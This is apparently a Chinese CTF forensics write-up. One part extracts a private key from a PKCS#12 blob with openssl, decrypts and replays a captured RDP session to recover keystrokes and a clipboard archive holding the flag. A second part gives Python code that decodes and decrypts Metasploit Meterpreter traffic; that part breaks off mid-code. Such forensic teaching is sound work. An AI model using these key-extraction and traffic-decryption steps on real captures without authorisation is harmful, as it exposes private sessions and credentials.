DUMP]:30820948308205D106092A864886F70D010701A08205C2048205BE308205BA308205B6060B2A864886F70D010C0A0102A08204F6308204F2301C060A2A864886F70D010C0103300E040866AFD4385D4302C4020207D0048204D093F23B4782B6438E5CB094A8C35CF1352F486FA1F7E3708A3F1BFC865A5EEF3C931DC82BA36EEF23609FE4717D0A021EEF8A981021BDADD04AFA64131A546CE65191A88C001ADCA9A5A15EDB1178E0DADDDCEDDCC3AB13BAADAE35B2B87378CC9158C0145DB1EB300E129D265C92E2C726E4790DA9F34AD0B80AF7BFD152B7AF4DD97B9B3BC4057CA245E4B871B871023F96832DCA3A4BA3E8628C34ACB48C75497CB8949CA48D1EF939495F2A0BE4B7497E0C19659EBE083ABFD8268D97149418C969CE28112F31255383994AA95B50C7A15285477A6D01B955E80C9F961FD03226C8233CA6F4851318D0B22B5B0E4D536CDF729827F2A12289E789675DDE3BBDC339376447AF09CD807AF811D216D148126B42177D7F1634BFAB0BB959A485BE82F7CE08FA8468FE526D48B02CA70CAF5EA55B786E7659DAFEFFC8292E15C251BC48D27F15860BD32E2FB67FB70DDED2CB7D199ECF107FEB5F57CA6D7D83ACA47DD20D23E3F7F73AF93753F1D6E6C42060A2F0A19CA9905CFCA4705F8DA96287D57584E9D0C9FEE127A1F8E91E6AA112FDD0AA42714BBFBDF1DB07BED4D3BB70B2AE3D614F75E17B8932E3ADCB8077DBE6EB9A3B723DFE7000B0B8DAD199D8FF4B8501BE45671BCAA8F3F5A9EB9EE67805F91C0734BE00F7EFDEAD031308879A852612AE3910830086EF4BC3CD6F9C14C5FA50F563EAB57C89F6AA49BBDF923D5E8847017C2F134AC4777E4E52D1DDDC1CCDDF800CC07DE1E733C8D233508E88306A0C9A035B1B61FA386F10CB1841C05C3442CAC764B0A5276A1047BF6EFA0E621A2FAE1A8792D8C5E20F692A472D88F96B32EB3D18B066BBEC04DAC120ADD3A0AFDAA2D81DF0A2CAFD1C135A0EC7AAEF4474B2853C125487DE8A7623F25F0029F912F9F689DD0AD5F4275FC8DFB6ADD908B677D3975AFBC207B0B24D225EDF28F88C17C451D6F0A8521CA55B873F611C742C5C7525B04C6C3E2BA0BC59D43C02EE517BA8D08E102F9837A6B37C505D2BD97D23AB4F6912B5EB67747EB572969057B923D347980E7F3338F2E70AE1E13B2071D9DD84991937B676838F8C42BB6A36A06A78B895063CBF9E20FD445EC96CF886D58FCA47230593FE7DA25535BBDAD2BED116FCF0A47BFEE90F6C0C227A5B9DFA33BDAB645585EBD3CC402DE595FF1A016A1B73472580FB2CB271CCEDFF473916D72334E4D5F4674EBA649636B00D05C852FFDF930360DCEFF949BEA357AF1DE79DD503E9705BAE51488F3B5F4468F15FC17593B7C06E2E5D7A26D02112E28034ED3D5C2956159CD2440D8B03BBA8E227608FE9C12FF0C0A12600AE3A3938AF7DDAB4BED9243A891D4EE684F5A0EC60DA908C5167F0302BBFB8940817D4C7D2F242DB6A980F196A2FF973223D73866B4E226D3F6EEB8177536FB10DA9E7BD864B0020C636F3A3673761A17B6865992FB0755AE9EB8036AA41776294D0FF8EA6F12CC9ECB45D45B154F2BF03B0A70E2B42DA1A7F99AA3FD4819857118FD77666D476C3C9BD258377994FB49EB5E820B416CCC5449895DEF2EAE3637CC8D5828D9DA7F1727FAEB740A7148BE35A4A689C75D152DD4DD431EAEA135E3AC5384BF7A226971B5BE18E041D046843F9BE8552292DF886C97F010DE239C4DD431163A88AB440BF14BD8B69D409C48366F289E59282EDE9796CAD4A1975FF52A2332DAC6756CB25AA24273B90E22B2B133A5C3F0805160E510B192D6BC18370F43181AC300D06092B06010401823711023100301306092A864886F70D0109153106040401000000302706092A864886F70D010914311A1E1800540053005300650063004B006500790053006500740031305D06092B060104018237110131501E4E004D006900630072006F0073006F006600740020005300740072006F006E0067002000430072007900700074006F0067007200610070006800690063002000500072006F007600690064006500723082036F06092A864886F70D010706A08203603082035C0201003082035506092A864886F70D010701301C060A2A864886F70D010C0106300E0408135DB999CA2CD6B1020207D0808203287D8BDD108BE4C5084D46D3A88CED4C6412DF2FA7D5346D9FB289B1DC4AF4AD2B791EDA0612555A56EC21EECD6FDCCF6E83647E8DDED72942F24F551FFCFB55B7181AE5D9B6B790EA8B3B27820139681726348100035B7D349B3F77FB5265FA83B73008FC1A4687687F30A3BFF0D7289BFBC82423D753F380B53B607E7C8A101B53781D0F0273F7C1E4E42E71E2739659A569A465710B3E34C1C9165592F5DD145ECCCE570C3F3E84606D5A14878DA6172F6DB403C3FC7AF92512B8406693D4405BD27070F58A8778C3AA8D71BDDD24327F4FC2BFD932E431B99CDD461B21B57B5D8F88E90597FDD2BCB709AF6CAA264E58C116D018DE4DEA7870B7C3BCC64A8E2A1EE29EA8CCA17A7D29B2C033E2F50ACE0E01A87E7CF24CBCB8A9F7366C95F05ACFB233670952CA38B265CC3FC0F6D5575B7B02C50E9C0E54FDE359D0D216A80F3C817166DE479B94D81EE0FC1130392E5BBABCD6E11D807A7FEE2F958C3785A5857BBBFCD1B1EC8DA4D3ABFD6E3077CEB5B572C5549660B73CD3981819B2ECE1527316E5DC3DC8A0A9BFADD6A0C0065E9A8E7E1F1C2F09166629DEDC0AC57B9328C112CF77B4F3CF0118102B94BD80B01B845B03BF079B2C4F9E461958F36FFDB7886C025A3A37D4D8E9E1804C773122FF6409FE819C4A50C1267058E93F6698DBD5D2D4D7D2EB6B4443C8D1AD0E253C1D7DFE23E3918D1F6399EBD4CB4FC9EFE18D83DF575C06F5D21F824297E26999A4DA9FBCFB626CDDF0B2A9FDAB56CAF10785FAAD847D8589AFF8B0A39601CB1BF6B6256E4FB65BABAFFC5C4E5208121E4175071D18763F9152962AE964DB271313D77B488C9A1AC176ADCE6E3B3A1DC092CA5A304B3FE93C1F8F4A58D8E1992C3445180FFD1EC126690E12FF09FCED1306B4D5BEB150888E15B435AEB3316FFA019C7B89AFE0D6823C459252AF9B30E643FAC481ABE6C5E6B09C1F0B7AEEFC6FA2FC40E6BF6741273C4CFEF2529B645DFE5B7FF18AF6B9FD6443B9D206BA2F1264A073DD1DF80E554D64DBFC934657C63BF5441CE223C1AF271C73525177ABCA5D8777916BF6D22908F3C22989349E3346BE0A4712FCF0A215B4A1F06C700A88290DA38FF6BF7B9C58DC01F0E35702F49F70C6858E2D75\n # \u7b7e\u540d\u4fe1\u606f\uff08\u504f\u79fb\u91cf 2410\uff09\n 2410:d=1  hl=2 l=  59 cons: SEQUENCE\n 2412:d=2  hl=2 l=  31 cons: SEQUENCE\n 2414:d=3  hl=2 l=   7 cons: SEQUENCE\n 2416:d=4  hl=2 l=   5 prim: OBJECT            :sha1\n 2423:d=3  hl=2 l=  20 prim: OCTET STRING      [HEX DUMP]:C6636BA1DC7A4063D2AD49F7DBB800AD92260253\n 2445:d=2  hl=2 l=  20 prim: OCTET STRING      [HEX DUMP]:9BADF56CE6069E1EB9339E0E9FCD096ACD0DBC5B\n 2467:d=2  hl=2 l=   2 prim: INTEGER           :07D0\n</code></pre> <p>\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u5927\u5806\u6570\u636e\uff0c\u4f46\u662f\u7531\u4e8e\u7ed3\u6784\u53ef\u4ee5\u5305\u542b\u5d4c\u5957\u6570\u636e\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u8981\u89e3\u7801\u7684\u516b\u4f4d\u5b57\u8282\u5b57\u7b26\u4e32\u6765\u6df1\u5165\u6316\u6398</p> <pre><code># -strparse 26 \u8868\u793a\u4ece\u6587\u4ef6\u504f\u79fb\u91cf 26 \u5b57\u8282\u5904 \u5f00\u59cb\u91cd\u65b0\u89e3\u6790 ASN.1 \u7ed3\u6784\n$ openssl asn1parse -inform DER -in extracted_data.bin -strparse 26\n    0:d=0  hl=4 l=2376 cons: SEQUENCE\n    4:d=1  hl=4 l=1489 cons: SEQUENCE\n    8:d=2  hl=2 l=   9 prim: OBJECT            :pkcs7-data\n   19:d=2  hl=4 l=1474 cons: cont [ 0 ]\n   23:d=3  hl=4 l=1470 prim: OCTET STRING      [HEX DUMP]:308205BA308205B6060B2A864886F70D010C0A0102A08204F6308204F2301C060A2A864886F70D010C0103300E040866AFD4385D4302C4020207D0048204D093F23B4782B6438E5CB094A8C35CF1352F486FA1F7E3708A3F1BFC865A5EEF3C931DC82BA36EEF23609FE4717D0A021EEF8A981021BDADD04AFA64131A546CE65191A88C001ADCA9A5A15EDB1178E0DADDDCEDDCC3AB13BAADAE35B2B87378CC9158C0145DB1EB300E129D265C92E2C726E4790DA9F34AD0B80AF7BFD152B7AF4DD97B9B3BC4057CA245E4B871B871023F96832DCA3A4BA3E8628C34ACB48C75497CB8949CA48D1EF939495F2A0BE4B7497E0C19659EBE083ABFD8268D97149418C969CE28112F31255383994AA95B50C7A15285477A6D01B955E80C9F961FD03226C8233CA6F4851318D0B22B5B0E4D536CDF729827F2A12289E789675DDE3BBDC339376447AF09CD807AF811D216D148126B42177D7F1634BFAB0BB959A485BE82F7CE08FA8468FE526D48B02CA70CAF5EA55B786E7659DAFEFFC8292E15C251BC48D27F15860BD32E2FB67FB70DDED2CB7D199ECF107FEB5F57CA6D7D83ACA47DD20D23E3F7F73AF93753F1D6E6C42060A2F0A19CA9905CFCA4705F8DA96287D57584E9D0C9FEE127A1F8E91E6AA112FDD0AA42714BBFBDF1DB07BED4D3BB70B2AE3D614F75E17B8932E3ADCB8077DBE6EB9A3B723DFE7000B0B8DAD199D8FF4B8501BE45671BCAA8F3F5A9EB9EE67805F91C0734BE00F7EFDEAD031308879A852612AE3910830086EF4BC3CD6F9C14C5FA50F563EAB57C89F6AA49BBDF923D5E8847017C2F134AC4777E4E52D1DDDC1CCDDF800CC07DE1E733C8D233508E88306A0C9A035B1B61FA386F10CB1841C05C3442CAC764B0A5276A1047BF6EFA0E621A2FAE1A8792D8C5E20F692A472D88F96B32EB3D18B066BBEC04DAC120ADD3A0AFDAA2D81DF0A2CAFD1C135A0EC7AAEF4474B2853C125487DE8A7623F25F0029F912F9F689DD0AD5F4275FC8DFB6ADD908B677D3975AFBC207B0B24D225EDF28F88C17C451D6F0A8521CA55B873F611C742C5C7525B04C6C3E2BA0BC59D43C02EE517BA8D08E102F9837A6B37C505D2BD97D23AB4F6912B5EB67747EB572969057B923D347980E7F3338F2E70AE1E13B2071D9DD84991937B676838F8C42BB6A36A06A78B895063CBF9E20FD445EC96CF886D58FCA47230593FE7DA25535BBDAD2BED116FCF0A47BFEE90F6C0C227A5B9DFA33BDAB645585EBD3CC402DE595FF1A016A1B73472580FB2CB271CCEDFF473916D72334E4D5F4674EBA649636B00D05C852FFDF930360DCEFF949BEA357AF1DE79DD503E9705BAE51488F3B5F4468F15FC17593B7C06E2E5D7A26D02112E28034ED3D5C2956159CD2440D8B03BBA8E227608FE9C12FF0C0A12600AE3A3938AF7DDAB4BED9243A891D4EE684F5A0EC60DA908C5167F0302BBFB8940817D4C7D2F242DB6A980F196A2FF973223D73866B4E226D3F6EEB8177536FB10DA9E7BD864B0020C636F3A3673761A17B6865992FB0755AE9EB8036AA41776294D0FF8EA6F12CC9ECB45D45B154F2BF03B0A70E2B42DA1A7F99AA3FD4819857118FD77666D476C3C9BD258377994FB49EB5E820B416CCC5449895DEF2EAE3637CC8D5828D9DA7F1727FAEB740A7148BE35A4A689C75D152DD4DD431EAEA135E3AC5384BF7A226971B5BE18E041D046843F9BE8552292DF886C97F010DE239C4DD431163A88AB440BF14BD8B69D409C48366F289E59282EDE9796CAD4A1975FF52A2332DAC6756CB25AA24273B90E22B2B133A5C3F0805160E510B192D6BC18370F43181AC300D06092B06010401823711023100301306092A864886F70D0109153106040401000000302706092A864886F70D010914311A1E1800540053005300650063004B006500790053006500740031305D06092B060104018237110131501E4E004D006900630072006F0073006F006600740020005300740072006F006E0067002000430072007900700074006F0067007200610070006800690063002000500072006F00760069006400650072\n 1497:d=1  hl=4 l= 879 cons: SEQUENCE\n 1501:d=2  hl=2 l=   9 prim: OBJECT            :pkcs7-encryptedData\n 1512:d=2  hl=4 l= 864 cons: cont [ 0 ]\n 1516:d=3  hl=4 l= 860 cons: SEQUENCE\n 1520:d=4  hl=2 l=   1 prim: INTEGER           :00\n 1523:d=4  hl=4 l= 853 cons: SEQUENCE\n 1527:d=5  hl=2 l=   9 prim: OBJECT            :pkcs7-data\n 1538:d=5  hl=2 l=  28 cons: SEQUENCE\n 1540:d=6  hl=2 l=  10 prim: OBJECT            :pbeWithSHA1And40BitRC2-CBC\n 1552:d=6  hl=2 l=  14 cons: SEQUENCE\n 1554:d=7  hl=2 l=   8 prim: OCTET STRING      [HEX DUMP]:135DB999CA2CD6B1\n 1564:d=7  hl=2 l=   2 prim: INTEGER           :07D0\n 1568:d=5  hl=4 l= 808 prim: cont [ 0 ]\n</code></pre> <p>\u518d\u6b21\uff0c\u8ba9\u6211\u4eec\u89e3\u7801\u5d4c\u5957\u7ed3\u6784</p> <pre><code>$ openssl asn1parse -inform DER -in extracted_data.bin -strparse 26 -strparse 23\n    0:d=0  hl=4 l=1466 cons: SEQUENCE\n    4:d=1  hl=4 l=1462 cons: SEQUENCE\n    8:d=2  hl=2 l=  11 prim: OBJECT            :pkcs8ShroudedKeyBag\n   21:d=2  hl=4 l=1270 cons: cont [ 0 ]\n   25:d=3  hl=4 l=1266 cons: SEQUENCE\n   29:d=4  hl=2 l=  28 cons: SEQUENCE\n   31:d=5  hl=2 l=  10 prim: OBJECT            :pbeWithSHA1And3-KeyTripleDES-CBC\n   43:d=5  hl=2 l=  14 cons: SEQUENCE\n   45:d=6  hl=2 l=   8 prim: OCTET STRING      [HEX DUMP]:66AFD4385D4302C4\n   55:d=6  hl=2 l=   2 prim: INTEGER           :07D0\n   59:d=4  hl=4 l=1232 prim: OCTET STRING      [HEX DUMP]:93F23B4782B6438E5CB094A8C35CF1352F486FA1F7E3708A3F1BFC865A5EEF3C931DC82BA36EEF23609FE4717D0A021EEF8A981021BDADD04AFA64131A546CE65191A88C001ADCA9A5A15EDB1178E0DADDDCEDDCC3AB13BAADAE35B2B87378CC9158C0145DB1EB300E129D265C92E2C726E4790DA9F34AD0B80AF7BFD152B7AF4DD97B9B3BC4057CA245E4B871B871023F96832DCA3A4BA3E8628C34ACB48C75497CB8949CA48D1EF939495F2A0BE4B7497E0C19659EBE083ABFD8268D97149418C969CE28112F31255383994AA95B50C7A15285477A6D01B955E80C9F961FD03226C8233CA6F4851318D0B22B5B0E4D536CDF729827F2A12289E789675DDE3BBDC339376447AF09CD807AF811D216D148126B42177D7F1634BFAB0BB959A485BE82F7CE08FA8468FE526D48B02CA70CAF5EA55B786E7659DAFEFFC8292E15C251BC48D27F15860BD32E2FB67FB70DDED2CB7D199ECF107FEB5F57CA6D7D83ACA47DD20D23E3F7F73AF93753F1D6E6C42060A2F0A19CA9905CFCA4705F8DA96287D57584E9D0C9FEE127A1F8E91E6AA112FDD0AA42714BBFBDF1DB07BED4D3BB70B2AE3D614F75E17B8932E3ADCB8077DBE6EB9A3B723DFE7000B0B8DAD199D8FF4B8501BE45671BCAA8F3F5A9EB9EE67805F91C0734BE00F7EFDEAD031308879A852612AE3910830086EF4BC3CD6F9C14C5FA50F563EAB57C89F6AA49BBDF923D5E8847017C2F134AC4777E4E52D1DDDC1CCDDF800CC07DE1E733C8D233508E88306A0C9A035B1B61FA386F10CB1841C05C3442CAC764B0A5276A1047BF6EFA0E621A2FAE1A8792D8C5E20F692A472D88F96B32EB3D18B066BBEC04DAC120ADD3A0AFDAA2D81DF0A2CAFD1C135A0EC7AAEF4474B2853C125487DE8A7623F25F0029F912F9F689DD0AD5F4275FC8DFB6ADD908B677D3975AFBC207B0B24D225EDF28F88C17C451D6F0A8521CA55B873F611C742C5C7525B04C6C3E2BA0BC59D43C02EE517BA8D08E102F9837A6B37C505D2BD97D23AB4F6912B5EB67747EB572969057B923D347980E7F3338F2E70AE1E13B2071D9DD84991937B676838F8C42BB6A36A06A78B895063CBF9E20FD445EC96CF886D58FCA47230593FE7DA25535BBDAD2BED116FCF0A47BFEE90F6C0C227A5B9DFA33BDAB645585EBD3CC402DE595FF1A016A1B73472580FB2CB271CCEDFF473916D72334E4D5F4674EBA649636B00D05C852FFDF930360DCEFF949BEA357AF1DE79DD503E9705BAE51488F3B5F4468F15FC17593B7C06E2E5D7A26D02112E28034ED3D5C2956159CD2440D8B03BBA8E227608FE9C12FF0C0A12600AE3A3938AF7DDAB4BED9243A891D4EE684F5A0EC60DA908C5167F0302BBFB8940817D4C7D2F242DB6A980F196A2FF973223D73866B4E226D3F6EEB8177536FB10DA9E7BD864B0020C636F3A3673761A17B6865992FB0755AE9EB8036AA41776294D0FF8EA6F12CC9ECB45D45B154F2BF03B0A70E2B42DA1A7F99AA3FD4819857118FD77666D476C3C9BD258377994FB49EB5E820B416CCC5449895DEF2EAE3637CC8D5828D9DA7F1727FAEB740A7148BE35A4A689C75D152DD4DD431EAEA135E3AC5384BF7A226971B5BE18E041D046843F9BE8552292DF886C97F010DE239C4DD431163A88AB440BF14BD8B69D409C48366F289E59282EDE9796CAD4A1975FF52A2332DAC6756CB25AA24273B90E22B2B133A5C3F0805160E510B192D6BC18370F4\n 1295:d=2  hl=3 l= 172 cons: SET\n 1298:d=3  hl=2 l=  13 cons: SEQUENCE\n 1300:d=4  hl=2 l=   9 prim: OBJECT            :Microsoft Local Key set\n 1311:d=4  hl=2 l=   0 cons: SET\n 1313:d=3  hl=2 l=  19 cons: SEQUENCE\n 1315:d=4  hl=2 l=   9 prim: OBJECT            :localKeyID\n 1326:d=4  hl=2 l=   6 cons: SET\n 1328:d=5  hl=2 l=   4 prim: OCTET STRING      [HEX DUMP]:01000000\n 1334:d=3  hl=2 l=  39 cons: SEQUENCE\n 1336:d=4  hl=2 l=   9 prim: OBJECT            :friendlyName\n 1347:d=4  hl=2 l=  26 cons: SET\n 1349:d=5  hl=2 l=  24 prim: BMPSTRING\n 1375:d=3  hl=2 l=  93 cons: SEQUENCE\n 1377:d=4  hl=2 l=   9 prim: OBJECT            :Microsoft CSP Name\n 1388:d=4  hl=2 l=  80 cons: SET\n 1390:d=5  hl=2 l=  78 prim: BMPSTRING\n</code></pre> <p>\u8fd9\u5b9e\u9645\u4e0a\u770b\u8d77\u6765\u50cf\u4e00\u4e2a PKCS12 \u6587\u4ef6\uff0c\u8fd9\u662f\u4e00\u79cd\u6346\u7ed1\u8bc1\u4e66\u548c\u79c1\u94a5\u7684\u5b58\u6863\u683c\u5f0f</p> <p>\u6211\u4eec\u53ef\u4ee5\u4ece\u4e2d\u63d0\u53d6\u79c1\u94a5</p> <pre><code># openssl pkcs12 \u8c03\u7528 OpenSSL \u7684 PKCS#12 \u5de5\u5177\n# -nocerts \u4e0d\u63d0\u53d6\u8bc1\u4e66\uff0c\u4ec5\u63d0\u53d6\u79c1\u94a5\n# -nodes \u4e0d\u52a0\u5bc6\u79c1\u94a5\n$ openssl pkcs12 -in extracted_data.bin -nocerts -nodes -out private.key\nEnter Import Password: mimikatz\nMAC verified OK\n</code></pre> <p>\u6211\u731c\u8bc1\u4e66\u6587\u4ef6\u7684\u5bc6\u7801\u662f \u201cmimikatz\u201d\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u4ece\u8fd9\u91cc\u83b7\u5f97\u76f8\u5173\u4fe1\u606f</p> <p>\u83b7\u53d6\u79c1\u94a5\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u540d\u4e3a RDP-Replay \u7684\u5de5\u5177\u91cd\u653e RDP \u4f1a\u8bdd\uff0c\u5e76\u627e\u51fa\u653b\u51fb\u8005\u5728\u5165\u4fb5\u671f\u95f4\u6240\u505a\u7684\u4e8b\u60c5</p> <p>\u7f16\u8bd1\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd0\u884c <code>rdp_replay</code> \u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5e76\u53ef\u4ee5\u9009\u62e9\u4fdd\u5b58\u653b\u51fb\u8005\u6309\u4e0b\u7684\u952e\u5e76\u5c06\u6355\u83b7\u7684\u526a\u8d34\u677f\u4e8b\u4ef6\u6570\u636e\u8f6c\u50a8\u5230\u6587\u4ef6\u4e2d</p> <p>\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u5c06\u91cd\u64ad\u7684\u89c6\u9891\u4fdd\u5b58\u5230\u6587\u4ef6\u4e2d</p> <pre><code># -o recording.avi \u5c06\u91cd\u653e\u7684 RDP \u4f1a\u8bdd\u5f55\u5236\u6210 AVI \u89c6\u9891\u6587\u4ef6\n# -p ./private.key \u6307\u5b9a\u79c1\u94a5\u6587\u4ef6\uff08\u7528\u4e8e\u89e3\u5bc6 TLS/SSL \u52a0\u5bc6\u7684 RDP \u6d41\u91cf\uff09\n# --save_clipboard \u8bb0\u5f55\u526a\u8d34\u677f\u5185\u5bb9\uff08\u5982\u679c RDP \u4f1a\u8bdd\u4e2d\u6709\u590d\u5236\u7c98\u8d34\u64cd\u4f5c\uff09\n# --show_keys \u663e\u793a\u6309\u952e\u8bb0\u5f55\uff08\u5728\u5f55\u5236\u7684\u89c6\u9891\u4e2d\u663e\u793a\u7528\u6237\u6309\u4e0b\u7684\u952e\uff09\n$ rdp_replay -r ../e8e2ceb9-b77f-4b26-b09a-fcec86e27497.pcap  -o recording.avi -p ./private.key --save_clipboard --show_keys &gt; output\n</code></pre> <p>\u4ed6\u6240\u505a\u7684\u662f\u4f7f\u7528\u4e0d\u5411\u7528\u6237\u663e\u793a\u7684\u5bc6\u7801\u538b\u7f29\u548c\u52a0\u5bc6\u6807\u5fd7\u6587\u4ef6\uff0c\u7136\u540e\u8fdb\u884c base64 \u7f16\u7801\u5e76\u590d\u5236\u5230\u526a\u8d34\u677f</p> <p>\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6211\u4eec\u5fc5\u987b\u4fdd\u5b58\u952e\u5165\u7684\u5bc6\u94a5\u548c\u526a\u8d34\u677f\u4e8b\u4ef6\u4fe1\u606f</p> <p>\u952e\u5165\u7684\u6309\u952e\u8bb0\u5f55\uff1a</p> <pre><code>RDP SSL MODE Requested by server!!\nSSL private key found.\n1024x756x8\nREALLY DELICIOUS PANCAKES&lt;Tab&gt;REALLY DELICIOUS PANCAKES\n</code></pre> <p>\u526a\u8d34\u677f\u7684\u5185\u5bb9\uff1a</p> <pre><code>N3q8ryccAATjAlOVMAAAAAAAAABqAAAAAAAAACmoQ4fA1DQXZvCzJGIg/8cxnh8QXnWoDkwNxjGL\n37P7rvVC2SMn8+wquEv/A5HBL9djQewBBAYAAQkwAAcLAQACJAbxBwEKUweBdxD1DDirkCEhAQAB\nAAwrJwAICgGwcALcAAAFARkJAAAAAAAAAAAAERMAZgBsAGEAZwAuAHQAeAB0AAAAGQAUCgEAAFNu\nlssb0wEVBgEAIAAAAAAA\n</code></pre> <p>\u7efc\u5408\u8d77\u6765\uff1a</p> <pre><code>$ cat ../clip-00000000-down | base64 -d -i &gt; flag.7z\n$ 7z x flag.7z\n\n7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18\np7zip Version 9.20 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,2 CPUs)\n\nProcessing archive: flag.7z\n\n\nEnter password (will not be echoed) :\nExtracting  flag.txt\n\nEverything is Ok\n\nSize:       39\nCompressed: 186\n$ cat flag.txt\nHITB{44519a67ffc654e40febc09e20e8e745}\n</code></pre>"},{"location":"Misc/Chapter5/5-29/","title":"MSF \u6d41\u91cf\u9690\u5199","text":""},{"location":"Misc/Chapter5/5-29/#msf-\u6d41\u91cf\u9690\u5199","title":"MSF \u6d41\u91cf\u9690\u5199","text":"<p>\u6253\u5f00\u6d41\u91cf\u5305\u8ffd\u8e2a TCP \u6d41\uff0c\u770b\u5230\u8fd9\u4e2a\u57fa\u672c\u4e0a\u786e\u8ba4\u5c31\u662f MSF \u4e86</p> <p></p> <p>\u5f80\u4e0b\u627e\u7ea2\u8272\u54cd\u5e94\u90e8\u5206</p> <p></p> <p>MSF \u6d41\u91cf\u7279\u5f81\uff1a</p> <p>\u7528\u5f00\u59cb\u7684 4 \u5b57\u8282\u5f02\u6216\u5bc6\u94a5\u5bf9\u540e\u7eed\u62a5\u6587\u8fdb\u884c\u5f02\u6216\u89e3\u5bc6\uff0c\u5f97\u5230 32 \u5b57\u8282\u7684\u62a5\u6587\u5934</p> <p>\u7136\u540e\u5982\u679c\u65e0\u52a0\u5bc6\uff0c\u5219\u662fTLV\u62a5\u6587\uff1b\u4e0d\u7136\u5c31\u662f 16 \u81ea\u5df1\u7684 IV\uff0c\u7136\u540e\u662f TLV \u62a5\u6587</p> <pre><code>Values: [XOR KEY][session guid][encryption flags][packet length][packet type][ .... TLV packets go here .... ]\nSize:   [   4   ][    16      ][      4       ][       4     ][     4     ][ ....          N          .... ]\n</code></pre> <pre><code>def DECPAK(PKT, AES_key = None):\n    PKT = PKT.decode(\"hex\")\n    PKT_dec = \"\"\n    XOR_KEY = PKT[:4]\n    #PKT_dec += p32(XOR_KEY)\n    for i in range(0, len(PKT)):\n        deced = chr(ord(PKT[i]) ^ ord(XOR_KEY[i % 4]))\n        PKT_dec += deced\n\n    PKT_ret={}\n    PKT_ret[\"XOR_KEY\"] = XOR_KEY\n    PKT_ret[\"GUID\"] = PKT_dec[4:4+16]\n    PKT_ret[\"ENC_FLAGS\"] = u32(PKT_dec[20:24][::-1])\n    PKT_ret[\"PKT_LENGTH\"] = u32(PKT_dec[24:28][::-1])\n    PKT_ret[\"PKT_TYPE\"] = u32(PKT_dec[28:32][::-1])\n    PKT_ret[\"TLVS\"] = []\n\n    pos = 32\n    if PKT_ret[\"ENC_FLAGS\"] == 0:\n        while pos &lt; len(PKT_dec):\n            #print PKT_dec[pos:].encode(\"hex\")\n            tlv_len = u32(PKT_dec[pos: pos + 4][::-1])\n            tlv_type = u32(PKT_dec[pos + 4: pos + 8][::-1])\n            tlv_content = PKT_dec[pos + 8: pos + tlv_len]\n            pos += tlv_len\n            PKT_ret[\"TLVS\"].append([tlv_len, tlv_type, tlv_content])\n    elif PKT_ret[\"ENC_FLAGS\"] == 1 and AES_key != None:\n        PKT_ret[\"IV\"] = PKT_dec[pos: pos + 16]\n        aes_cipher = AESCipher(AES_key, PKT_ret[\"IV\"])\n        PKT_dec = PKT_dec[ :32 + 16] + aes_cipher.decrypt(PKT_dec[32 + 16: ])\n        pos += 16\n        while pos &lt; len(PKT_dec):\n            #print PKT_dec[pos:].encode(\"hex\")\n            tlv_len = u32(PKT_dec[pos: pos + 4][::-1])\n            tlv_type = u32(PKT_dec[pos + 4: pos + 8][::-1])\n            tlv_content = PKT_dec[pos + 8: pos + tlv_len]\n            pos += tlv_len\n            PKT_ret[\"TLVS\"].append([tlv_len, tlv_type, tlv_content])\n\n    return PKT_ret\n</code></pre> <p>\u9996\u5148 Meterpreter \u4e3b\u673a\u4f1a\u5411\u88ab\u63a7\u7aef\u53d1\u9001\u516c\u94a5\uff0c\u8fd9\u90e8\u5206\u9ed8\u8ba4\u662f\u4e0d\u52a0\u5bc6\u7684\uff0c\u672c\u9898\u7ed9\u4e86\u79c1\u94a5\uff0c\u6240\u4ee5\u516c\u94a5\u5c31\u6ca1\u6709\u5fc5\u8981\u7528\u4e86</p> <p>\u7136\u540e\u88ab\u63a7\u7aef\u6839\u636e\u516c\u94a5\uff0c\u5bf9 AES25 6\u7684\u5bc6\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u53d1\u9001\u7ed9\u670d\u52a1\u7aef</p> <p>\u670d\u52a1\u7aef\u548c\u88ab\u63a7\u7aef\u63a5\u4e0b\u6765\u5c31\u6839\u636e IV \u5bf9\u5bc6\u6587\u8fdb\u884c\u6253\u4e71\uff0c\u4e92\u76f8\u4f7f\u7528 AES256 \u5bc6\u94a5\u89e3\u5bc6</p> <p>\u4f9d\u7167\u8fd9\u4e2a\u601d\u8def\uff0c\u6211\u4eec\u5bf9\u62a5\u6587\u8fdb\u884c\u8ffd\u8e2a\uff0c\u89e3\u5bc6\u51fa AES256 \u7684\u5bc6\u94a5\uff0c\u4ece\u540e\u5f80\u524d\u89e3\u5305\u67e5\u627e\u653b\u51fb\u8005\u7684\u547d\u4ee4</p> <pre><code>AES_PAK = DECPAK(\"2926993adf8c06b90319d8059f51ec99b401f9b42926993a292698b52926993b2926991c2927993b4a49eb5f7648fc5d4652f05b5d43c64e4550c65f4745eb435952f0554726993a290f993b2924ac0e181fac0f1110a90d1f10ab031e13ac081b16aa0f1a16a0031813af0a1f15993a2926953a2b24be3a2926983a2927913a2d24b039ec75e27c93f3e0167fb28dd2c98ea0fd2ff42887d961f4e205a619311cf4b8dd93f189d24b8eb45af277bc76cc0ea8d5a0b3332812e6c8f73cced9f1d32189311dc13c30b80ebf944228979fd974a6ce23aacf386ebb5dbc1ac414a49678e6425944edf4a56f263a9c9e2a80e4d1884b35fc8da6e68bff64d33265350bf3e2b72dc5b0f0580cc12925074fc5505c9cd250b279150b9701cf5b2666ae9d0a0722f8b72aed8ffaa51f43594ebebe13b5bcb75e8a33c8cd396445c0c9da3d5a5b862bde38f62d13afd5387a62abce70e3d4192e3e96996ceaa0d1b0c7796028bdeabfbd8eddd13576f23135e1e7b06a0057a4b07bc786394ba1cd691547fad5db3a2926953a2b269d3a2926993a2926813a2d27542832d93a2fb12d08349729256baeb187\")\nprint AES_PAK\n\nAES_key_enc = AES_PAK[\"TLVS\"][3][2]\n\nAES_key = rsa_decode(AES_key_enc, privkey_pem)\n\nprint AES_key.encode(\"hex\"), len(AES_key)\n\nprint 